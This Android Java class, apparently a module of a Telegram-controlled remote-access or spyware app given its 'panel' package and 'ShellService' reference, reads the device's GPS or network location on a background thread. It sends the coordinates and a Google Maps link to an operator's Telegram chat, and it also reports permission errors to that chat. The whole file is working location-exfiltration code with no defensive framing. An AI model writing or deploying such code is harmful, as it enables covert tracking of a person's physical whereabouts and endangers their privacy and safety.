package com.java.panel;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import androidx.core.app.ActivityCompat;

public class LocationHelper {

    public static void fetchAndSendLocation(Context context, String chatId) {
        new Thread(() -> {
            try {
                LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                if (lm != null) {
                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                        ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        
                        Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (loc == null) {
                            loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        }

                        if (loc != null) {
                            double lat = loc.getLatitude();
                            double lon = loc.getLongitude();
                            if (ShellService.instance != null) {
                                ShellService.instance.sendTelegramMessage(chatId, 
                                    "📍 Location Report:\nLatitude: " + lat + "\nLongitude: " + lon + "\n🔗 https://www.google.com/maps?q=" + lat + "," + lon);
                            }
                        } else {
                            if (ShellService.instance != null) {
                                ShellService.instance.sendTelegramMessage(chatId, "❌ Could not retrieve GPS/Network location data.");
                            }
                        }
                    } else {
                        if (ShellService.instance != null) {
                            ShellService.instance.sendTelegramMessage(chatId, "❌ Location permission not granted.");
                        }
                    }
                }
            } catch (Exception e) {
                if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(chatId, "❌ Location error: " + e.getMessage());
                }
            }
        }).start();
    }
}
